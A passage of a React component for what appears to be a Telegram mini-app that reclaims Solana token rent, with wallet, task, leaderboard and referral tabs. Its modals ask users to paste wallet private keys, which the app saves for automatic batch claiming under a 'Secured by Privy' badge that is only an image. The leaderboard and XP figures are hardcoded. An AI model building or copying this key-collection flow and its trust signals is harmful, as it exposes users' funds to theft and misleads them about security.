                            copyToClipboard(account.mintAddress);
                          }}
                        >
                          {copiedAddress === account.mintAddress ? (
                            <CheckCircle className="w-3.5 h-3.5 text-primary" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                        </Button>
                      </div>
                    ))}
                  </div>
                )}

                <Button 
                  className="w-full h-12 rounded-xl bg-primary text-primary-foreground hover:bg-primary/90 font-black text-base mt-4 transition-all active:scale-[0.98] shadow-md shadow-primary/20 border border-primary-foreground/10 flex items-center justify-center gap-2"
                  onClick={claimRent}
                  disabled={isSubmittingKey}
                >
                  {isSubmittingKey ? (
                    <div className="flex items-center gap-2">
                      <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
                      CLAIMING...
                    </div>
                  ) : (
                    <>
                      <Coins className="w-5 h-5" />
                      CLAIM {displayClaimableNet.toFixed(4)} SOL
                    </>
                  )}
                </Button>
              </div>
            )}
          </TabsContent>

          {/* Wallets Tab */}
          <TabsContent value="wallets" className="space-y-4 mt-0 outline-none">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-base font-black text-foreground tracking-tight uppercase tracking-widest">Saved Wallets</h2>
                <p className="text-[10px] text-muted-foreground mt-0.5 uppercase tracking-wider font-medium">Manage and batch claim</p>
              </div>
              <Button
                onClick={() => { setIsAddWalletModalOpen(true); setAddWalletKey(''); setAddWalletModalAccounts([]); setAddWalletModalRent(0); setAddWalletDerivedAddress(''); setAddWalletModalWalletId(null); setError(''); }}
                className="h-10 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground font-black text-xs px-4 shadow-md shadow-primary/20 border border-primary-foreground/10 flex items-center gap-2"
              >
                <Plus className="w-4 h-4" />
                ADD
              </Button>
            </div>

            {/* Batch Operations - Home-consistent design */}
            {savedWallets.filter(w => w.has_key).length > 0 && (
              <div className="w-full rounded-2xl bg-card border-2 border-border py-4 px-4 shadow-sm space-y-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                    <Coins className="w-5 h-5 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-black text-sm text-foreground uppercase tracking-widest">Batch Claim</h3>
                    <p className="text-[10px] text-muted-foreground">Scan all wallets with keys</p>
                  </div>
                </div>

                {batchResults ? (
                  <div className="space-y-3 animate-in fade-in">
                    <div className="p-3 rounded-xl bg-secondary/50 border-2 border-border flex justify-between items-center">
                      <div>
                        <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest mb-0.5">Total</p>
                        <p className="font-black text-xl text-foreground">{batchResults.totalRent.toFixed(4)} <span className="text-primary text-sm">SOL</span></p>
                      </div>
                      <div className="text-right">
                        <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest mb-0.5">Accounts</p>
                        <p className="font-black text-xl text-foreground">{batchResults.totalAccounts}</p>
                      </div>
                    </div>
                    
                    <div className="flex gap-3">
                      <Button variant="outline" className="flex-1 h-12 rounded-xl font-bold border-2 text-xs" onClick={() => setBatchResults(null)} disabled={isBatchClaiming}>
                        CANCEL
                      </Button>
                      <Button className="flex-1 h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] border border-primary-foreground/10 text-xs" onClick={claimAllWallets} disabled={isBatchClaiming || batchResults.totalAccounts === 0}>
                        {isBatchClaiming ? <div className="flex items-center gap-2"><div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>CLAIMING...</div> : 'CLAIM ALL'}
                      </Button>
                    </div>
                  </div>
                ) : (
                  <Button className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground font-black text-sm shadow-md shadow-primary/20 active:scale-[0.98] border border-primary-foreground/10" onClick={scanAllWallets} disabled={isBatchScanning}>
                    {isBatchScanning ? <div className="flex items-center gap-2"><div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>SCANNING...</div> : 'SCAN ALL WALLETS'}
                  </Button>
                )}
              </div>
            )}

            {(telegramError || error) && (
              <div className="p-3 rounded-xl bg-destructive/10 border-2 border-destructive/20 flex items-start gap-3">
                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <p className="text-sm font-medium text-destructive">{telegramError || error}</p>
              </div>
            )}

            {success && (
              <div className="p-3 rounded-xl bg-green-500/10 border-2 border-green-500/20 flex flex-col gap-2 dark:bg-green-500/20 dark:border-green-500/30">
                <div className="flex items-start gap-3">
                  <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400 shrink-0 mt-0.5" />
                  <p className="text-sm font-medium text-green-700 dark:text-green-300">{success}</p>
                </div>
                {successTxSignature && (
                  <a href={`https://solscan.io/tx/${successTxSignature}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1.5 text-xs font-bold text-green-600 dark:text-green-400 hover:underline mt-1">
                    View on Solscan <ArrowUpRight className="w-3.5 h-3.5" />
                  </a>
                )}
              </div>
            )}

            <div className="space-y-3">
              {savedWallets.length === 0 ? (
                <div className="w-full rounded-2xl bg-card border-2 border-border py-8 px-4 shadow-sm text-center">
                  <div className="w-12 h-12 rounded-xl bg-secondary flex items-center justify-center mx-auto mb-3">
                    <Wallet className="w-6 h-6 text-muted-foreground" />
                  </div>
                  <p className="font-bold text-sm text-foreground">No wallets yet</p>
                  <p className="text-[10px] text-muted-foreground mt-1">Add a wallet below or scan one on Home</p>
                  <Button onClick={() => setIsAddWalletModalOpen(true)} className="mt-4 h-10 rounded-xl bg-primary hover:bg-primary/90 font-black text-xs" variant="default">
                    <Plus className="w-4 h-4 mr-2" /> ADD WALLET
                  </Button>
                </div>
              ) : (
                savedWallets.map((wallet) => (
                  <div key={wallet.id} className="w-full rounded-2xl bg-card border-2 border-border p-4 shadow-sm hover:border-primary/30 transition-all">
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex items-center gap-3 min-w-0 flex-1">
                        <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
                          <Key className="w-5 h-5 text-foreground" />
                        </div>
                        <div className="min-w-0">
                          <div className="font-mono text-xs font-bold text-foreground truncate">
                            {wallet.public_key.slice(0, 8)}...{wallet.public_key.slice(-8)}
                          </div>
                          <div className="flex items-center gap-2 mt-1 flex-wrap">
                            {wallet.has_key ? (
                              <Badge variant="secondary" className="bg-primary/10 text-primary border-0 text-[9px] px-1.5 py-0 font-black uppercase tracking-widest">Key</Badge>
                            ) : (
                              <Button variant="outline" size="sm" className="h-6 rounded-lg text-[9px] font-black px-2 border-2" onClick={() => openAddKeyModal(wallet)}>
                                ADD KEY
                              </Button>
                            )}
                            <span className="text-[9px] font-medium text-muted-foreground">{Number(wallet.total_claimed).toFixed(4)} SOL claimed</span>
                          </div>
                        </div>
                      </div>
                      <Button variant="ghost" size="icon" onClick={() => handleDeleteWallet(wallet.id)} className="text-muted-foreground hover:text-destructive hover:bg-destructive/10 h-9 w-9 rounded-lg shrink-0">
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                ))
              )}
            </div>
          </TabsContent>

          {/* Tasks Tab */}
          <TabsContent value="tasks" className="space-y-6 mt-0 outline-none">
            <div className="bg-card rounded-3xl p-6 border-2 border-border shadow-sm relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-primary/10 rounded-full blur-2xl -mr-16 -mt-16" />
              <div className="flex justify-between items-end mb-5 relative z-10">
                <div>
                  <p className="text-xs font-bold text-primary uppercase tracking-widest mb-1">Your Level</p>
                  <h2 className="text-3xl font-black text-foreground tracking-tight">Novice</h2>
                </div>
                <div className="text-right">
                  <p className="text-sm font-black text-foreground">250 <span className="text-muted-foreground font-semibold">/ 500 XP</span></p>
                </div>
              </div>
              <Progress value={50} className="h-3 bg-secondary relative z-10" />
            </div>

            <div className="space-y-4">
              <h3 className="font-black text-xl px-1 text-foreground">Daily Tasks</h3>
              
              <div className="space-y-3">
                {[
                  { icon: CheckCircle, title: 'Daily Check-in', desc: 'Come back tomorrow', xp: '+10 XP', done: true },
                  { icon: Target, title: 'Share on Telegram', desc: 'Share with 3 friends', xp: '+25 XP', done: false },
                  { icon: Users, title: 'Invite a Friend', desc: 'They must claim rent', xp: '+50 XP', done: false },
                ].map((task, i) => (
                  <div key={i} className={`flex items-center justify-between p-5 rounded-2xl border-2 transition-all ${task.done ? 'bg-secondary/30 border-transparent opacity-60' : 'bg-card border-border hover:border-primary/30 shadow-sm group cursor-pointer'}`}>
                    <div className="flex items-center gap-4">
                      <div className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-colors ${task.done ? 'bg-background' : 'bg-primary/10 group-hover:bg-primary/20'}`}>
                        <task.icon className={`w-6 h-6 ${task.done ? 'text-muted-foreground' : 'text-primary'}`} />
                      </div>
                      <div>
                        <h4 className={`font-bold text-base ${task.done ? 'text-muted-foreground line-through' : 'text-foreground'}`}>{task.title}</h4>
                        <p className="text-xs font-medium text-muted-foreground mt-0.5">{task.desc}</p>
                      </div>
                    </div>
                    <div className="flex flex-col items-end gap-2">
                      <span className={`text-sm font-black ${task.done ? 'text-muted-foreground' : 'text-primary'}`}>{task.xp}</span>
                      {!task.done && (
                        <button className="text-xs font-bold bg-secondary hover:bg-primary hover:text-primary-foreground text-foreground px-4 py-2 rounded-xl transition-all active:scale-95">
                          START
                        </button>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </TabsContent>

          {/* Stats Tab */}
          <TabsContent value="stats" className="space-y-6 mt-0 outline-none">
            <div className="px-1 flex items-center justify-between">
              <div>
                <h2 className="text-xl font-bold text-foreground tracking-tight">Statistics</h2>
                <p className="text-sm font-medium text-muted-foreground mt-1">Your claiming performance</p>
              </div>
            </div>
            
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-card border-2 border-border p-6 rounded-3xl shadow-sm flex flex-col items-center justify-center text-center space-y-3 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-16 h-16 bg-primary/10 rounded-full blur-xl -mr-8 -mt-8" />
                <div className="w-12 h-12 rounded-2xl bg-primary/10 flex items-center justify-center mb-1 relative z-10">
                  <Coins className="w-6 h-6 text-primary" />
                </div>
                <p className="text-xs font-bold text-primary uppercase tracking-widest relative z-10">Total Claimed</p>
                <p className="text-3xl font-black text-foreground relative z-10">
                  {userStats ? Number(userStats.total_sol_claimed).toFixed(4) : '0.00'} <span className="text-sm font-bold text-primary">SOL</span>
                </p>
              </div>
              
              <div className="bg-card border-2 border-border p-6 rounded-3xl shadow-sm flex flex-col items-center justify-center text-center space-y-3 relative overflow-hidden">
                <div className="absolute bottom-0 left-0 w-16 h-16 bg-primary/10 rounded-full blur-xl -ml-8 -mb-8" />
                <div className="w-12 h-12 rounded-2xl bg-secondary flex items-center justify-center mb-1 relative z-10">
                  <Trash2 className="w-6 h-6 text-foreground" />
                </div>
                <p className="text-xs font-bold text-muted-foreground uppercase tracking-widest relative z-10">Accounts Closed</p>
                <p className="text-3xl font-black text-foreground relative z-10">
                  {userStats ? userStats.total_accounts_closed : '0'}
                </p>
              </div>
            </div>
            
            <div className="bg-card border-2 border-border rounded-3xl p-6 shadow-sm relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-primary/5 rounded-full blur-2xl -mr-16 -mt-16" />
              <h3 className="font-black text-xl mb-5 relative z-10 text-foreground">Global Leaderboard</h3>
              <div className="space-y-3 relative z-10">
                <div className="flex items-center justify-between p-4 bg-gradient-to-r from-primary/20 to-secondary rounded-2xl border border-primary/20 hover:border-primary/40 transition-colors shadow-sm">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-primary text-primary-foreground flex items-center justify-center font-black text-base shadow-md">
                      1
                    </div>
                    <span className="font-bold text-base text-foreground">Wallet 7x...9p</span>
                  </div>
                  <span className="font-black text-lg text-primary drop-shadow-sm">14.2 SOL</span>
                </div>
                <div className="flex items-center justify-between p-4 bg-secondary/50 rounded-2xl border border-transparent hover:border-border transition-colors">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-background border-2 border-border text-foreground flex items-center justify-center font-bold text-base">
                      2
                    </div>
                    <span className="font-bold text-base text-foreground">Wallet 3m...2a</span>
                  </div>
                  <span className="font-black text-lg text-foreground">8.5 SOL</span>
                </div>
                <div className="flex items-center justify-between p-4 bg-secondary/30 rounded-2xl border border-transparent hover:border-border transition-colors">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-background border-2 border-border text-foreground flex items-center justify-center font-bold text-base">
                      3
                    </div>
                    <span className="font-bold text-base text-foreground">Wallet 9k...4f</span>
                  </div>
                  <span className="font-black text-lg text-foreground">5.1 SOL</span>
                </div>
              </div>
            </div>
          </TabsContent>

          {/* Friends Tab */}
          <TabsContent value="friends" className="space-y-6 mt-0 outline-none">
            <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-primary to-secondary-foreground p-8 text-center shadow-xl border-2 border-primary/20">
              <div className="absolute top-0 left-0 w-full h-full bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 mix-blend-overlay"></div>
              <div className="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-3xl" />
              <div className="relative z-10">
                <div className="w-16 h-16 rounded-2xl bg-white/10 backdrop-blur-md flex items-center justify-center mx-auto mb-5 shadow-inner border border-white/20">
                  <Gift className="w-8 h-8 text-white drop-shadow-md" />
                </div>
                <h2 className="text-3xl font-black text-white tracking-tight mb-2 drop-shadow-sm">Invite & Earn</h2>
                <p className="text-white/90 text-sm font-medium mb-8 max-w-[240px] mx-auto leading-relaxed">
                  Get <span className="font-black text-white bg-white/20 px-2 py-0.5 rounded-md">0.01 SOL</span> for every friend who joins and claims rent.
                </p>
                <Button className="w-full h-14 rounded-2xl bg-white text-primary hover:bg-gray-50 font-black text-lg shadow-xl active:scale-[0.98] transition-all">
                  <Copy className="w-5 h-5 mr-2" />
                  COPY INVITE LINK
                </Button>
              </div>
            </div>

            <div className="bg-card rounded-3xl p-6 border-2 border-border shadow-sm">
              <div className="flex items-center justify-between mb-8">
                <h3 className="font-black text-xl text-foreground">Your Referrals</h3>
                <Badge variant="secondary" className="font-bold bg-primary/10 text-primary border-0 px-3 py-1">0 TOTAL</Badge>
              </div>
              
              <div className="flex flex-col items-center justify-center py-10 text-center">
                <div className="w-16 h-16 rounded-3xl bg-secondary flex items-center justify-center mb-4 border border-border">
                  <Users className="w-8 h-8 text-muted-foreground" />
                </div>
                <p className="text-base font-bold text-foreground">No friends yet</p>
                <p className="text-sm font-medium text-muted-foreground mt-1">Share your link to start earning</p>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>

      {/* Fixed Bottom Navigation - App Style */}
      <div className="fixed bottom-0 left-0 right-0 z-50 bg-background/90 backdrop-blur-xl border-t border-border pb-safe">
        <div className="flex justify-around items-center px-2 py-2 max-w-md mx-auto">
          {[
            { id: 'home', icon: Wallet, label: 'HOME' },
            { id: 'wallets', icon: ShieldAlert, label: 'WALLETS' },
            { id: 'stats', icon: BarChart3, label: 'STATS' },
            { id: 'tasks', icon: Target, label: 'TASKS' },
            { id: 'friends', icon: Users, label: 'INVITE' },
          ].map((tab) => {
            const isActive = activeTab === tab.id
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex flex-col items-center justify-center w-16 h-14 gap-1.5 rounded-2xl transition-all ${
                  isActive 
                    ? 'text-primary' 
                    : 'text-muted-foreground hover:text-foreground hover:bg-secondary/50'
                }`}
              >
                <div className={`relative flex items-center justify-center w-8 h-8 rounded-xl transition-all duration-300 ${isActive ? 'bg-primary/10 scale-110' : ''}`}>
                  <tab.icon className={`w-5 h-5 transition-all duration-300 ${isActive ? 'stroke-[2.5px]' : 'stroke-2'}`} />
                </div>
                <span className={`text-[9px] tracking-widest transition-all duration-300 ${isActive ? 'font-black' : 'font-bold'}`}>
                  {tab.label}
                </span>
              </button>
            )
          })}
        </div>
      </div>

              {/* Video Modal */}
      {isVideoModalOpen && (
        <div 
          className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200"
          onClick={() => setIsVideoModalOpen(false)}
        >
          <div 
            className="bg-card border-2 border-border rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl animate-in zoom-in-95 duration-200 relative"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary" />
            <div className="relative">
              <img
                src="https://i.imgur.com/Q8z8eYX.png"
                alt="How it works"
                className="w-full aspect-video object-cover"
              />
              <div className="absolute inset-0 flex items-center justify-center bg-black/30">
                <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center shadow-lg">
                  <PlayCircle className="w-8 h-8 text-white ml-1" />
                </div>
              </div>
            </div>
            <div className="p-6 space-y-4">
              <h3 className="text-xl font-black text-foreground text-center">Watch How It Works</h3>
              <p className="text-sm text-muted-foreground text-center">
                Open the tutorial video in Telegram to learn how to claim your rent.
              </p>
              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 rounded-2xl font-bold border-2"
                  onClick={() => setIsVideoModalOpen(false)}
                >
                  CLOSE
                </Button>
                <a
                  href={TELEGRAM_VIDEO_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1"
                >
                  <Button className="w-full h-12 rounded-2xl bg-primary text-primary-foreground font-black shadow-xl shadow-primary/25 active:scale-[0.98] transition-all border border-primary-foreground/10">
                    WATCH ON TELEGRAM
                  </Button>
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

              {/* Add Wallet Modal */}
      {isAddWalletModalOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200" onClick={closeAddWalletModal}>
          <div className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4 shadow-2xl animate-in zoom-in-95 duration-200 relative overflow-hidden" onClick={(e) => e.stopPropagation()}>
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary" />
            <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
              <Plus className="w-6 h-6 text-primary" />
            </div>
            <h3 className="text-xl font-black text-foreground tracking-tight">Add Wallet</h3>
            <p className="text-xs text-muted-foreground">Paste your private key. We derive your address and check what you can claim.</p>
            <div className="space-y-3">
              <Label className="text-[11px] font-black text-muted-foreground uppercase tracking-widest">Private Key (Base58)</Label>
              <Input type="password" placeholder="Paste your private key..." value={addWalletKey} onChange={(e) => { setAddWalletKey(e.target.value); setAddWalletModalAccounts([]); setAddWalletModalRent(0); setAddWalletDerivedAddress(''); }} className="h-12 bg-background border-2 border-border rounded-xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0" />
              <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
                <Lock className="w-3 h-3 shrink-0" />
                <span>Secured by</span>
                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
                <span className="font-semibold text-foreground">Privy</span>
              </div>
            </div>
            {addWalletDerivedAddress && (
              <p className="text-[10px] text-muted-foreground font-mono">{addWalletDerivedAddress.slice(0, 8)}...{addWalletDerivedAddress.slice(-8)}</p>
            )}
            {!addWalletModalAccounts.length && addWalletDerivedAddress === '' ? (
              <Button className="w-full h-12 rounded-xl bg-primary font-black shadow-md shadow-primary/20" onClick={handleAddWalletScan} disabled={!addWalletKey.trim() || addWalletModalScanning}>
                {addWalletModalScanning ? <div className="flex items-center gap-2"><div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground" />CHECKING...</div> : 'CHECK CLAIMABLE'}
              </Button>
            ) : null}
            {addWalletModalAccounts.length > 0 && (
              <div className="space-y-3 animate-in fade-in">
                <button onClick={() => setAddWalletModalExpanded(!addWalletModalExpanded)} className="w-full flex items-center justify-between px-3 py-2.5 bg-secondary/50 rounded-xl border border-transparent hover:border-border transition-all">
                  <div className="flex items-center gap-2">
                    <Coins className="w-3 h-3 text-primary" />
                    <span className="font-bold text-xs uppercase tracking-widest">Accounts</span>
                    <Badge variant="secondary" className="font-black bg-primary text-primary-foreground border-0 text-[10px] px-1.5 py-0">{addWalletModalAccounts.length}</Badge>
                  </div>
                  <ChevronDown className={`w-4 h-4 transition-transform ${addWalletModalExpanded ? 'rotate-180' : ''}`} />
                </button>
                {addWalletModalExpanded && (
                  <div className="space-y-2 max-h-[200px] overflow-y-auto pr-1 custom-scrollbar">
                    {addWalletModalAccounts.map((acc, i) => (
                      <div key={i} className="flex items-center justify-between p-3 bg-secondary/30 rounded-xl border-2 border-border">
                        <div className="flex items-center gap-2 min-w-0">
                          {acc.tokenImage ? <img src={acc.tokenImage} alt="" className="w-7 h-7 rounded-full object-cover" /> : <Coins className="w-4 h-4 text-muted-foreground" />}
                          <div>
                            <div className="font-bold text-xs truncate">{acc.tokenName}</div>
                            <div className="text-[10px] font-black text-primary">+{(acc.rentAmount / 1e9).toFixed(4)} SOL</div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
                <Button className="w-full h-12 rounded-xl bg-primary font-black shadow-md shadow-primary/20" onClick={handleAddWalletClaim} disabled={addWalletModalClaiming}>
                  {addWalletModalClaiming ? <div className="flex items-center gap-2"><div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground" />CLAIMING...</div> : <>CLAIM {(addWalletModalRent * 0.85).toFixed(4)} SOL</>}
                </Button>
              </div>
            )}
            {addWalletDerivedAddress && addWalletModalAccounts.length === 0 && !addWalletModalScanning && (
              <div className="space-y-2">
                <p className="text-xs text-muted-foreground">No claimable accounts found.</p>
                <Button className="w-full h-12 rounded-xl font-black" variant="outline" onClick={handleAddWalletOnly} disabled={addWalletModalClaiming}>
                  {addWalletModalClaiming ? <div className="animate-spin rounded-full h-4 w-4 border-2" /> : 'ADD WALLET ANYWAY'}
                </Button>
              </div>
            )}
            {(telegramError || error) && <div className="p-3 rounded-xl bg-destructive/10 border border-destructive/20"><p className="text-sm font-medium text-destructive">{telegramError || error}</p></div>}
            <Button variant="outline" className="w-full h-12 rounded-xl font-bold border-2" onClick={closeAddWalletModal}>CANCEL</Button>
          </div>
        </div>
      )}

              {/* Private Key Modal */}
      {isKeyModalOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200">
          <div className="bg-card border-2 border-border p-6 rounded-2xl w-full max-w-sm space-y-4 shadow-2xl animate-in zoom-in-95 duration-200 relative overflow-hidden" onClick={(e) => e.stopPropagation()}>
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary" />
            <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
              <Key className="w-6 h-6 text-primary" />
            </div>
            <h3 className="text-xl font-black text-foreground tracking-tight">{addKeyWalletId ? 'Add Private Key' : 'Secure Your Wallet'}</h3>
            <p className="text-xs text-muted-foreground">
              {addKeyWalletId
                ? <>Add the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{addKeyWalletAddress.slice(0, 4)}...{addKeyWalletAddress.slice(-4)}</span> to enable batch claiming.</>
                : <>To claim rent automatically, we need the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span>.</>
              }
            </p>

            <div className="space-y-3">
              <Label htmlFor="privateKey" className="text-[11px] font-black text-muted-foreground uppercase tracking-widest ml-1">Private Key (Base58)</Label>
              <Input
                id="privateKey"
                type="password"
                placeholder="Paste your private key..."
                value={privateKeyInput}
                onChange={(e) => setPrivateKeyInput(e.target.value)}
                className="h-12 bg-background border-2 border-border rounded-xl font-mono text-base ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none min-w-0"
              />
              <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
                <Lock className="w-3 h-3 shrink-0" />
                <span>Secured by</span>
                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
                <span className="font-semibold text-foreground">Privy</span>
              </div>
            </div>

            {(telegramError || error) && (
              <div className="p-3 rounded-xl bg-destructive/10 border border-destructive/20 flex items-start gap-3">
                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <p className="text-sm font-medium text-destructive">{telegramError || error}</p>
              </div>
            )}

            <div className="flex gap-3">
              <Button 
                variant="outline" 
                className="w-full h-12 rounded-xl font-bold border-2"
                onClick={addKeyWalletId ? closeKeyModal : () => { setIsKeyModalOpen(false); setPrivateKeyInput(''); setError(''); setAddKeyWalletId(null); setAddKeyWalletAddress(''); }}
              >
                CANCEL
              </Button>
              <Button 
                className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] transition-all border border-primary-foreground/10"
                onClick={addKeyWalletId ? handleAddKeyOnly : handleSavePrivateKey}
                disabled={!privateKeyInput || isSubmittingKey}
              >
                {isSubmittingKey ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
                    SAVING...
                  </div>
                ) : addKeyWalletId ? (
                  'SAVE KEY'
                ) : (
                  'SAVE & CLAIM'
                )}
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}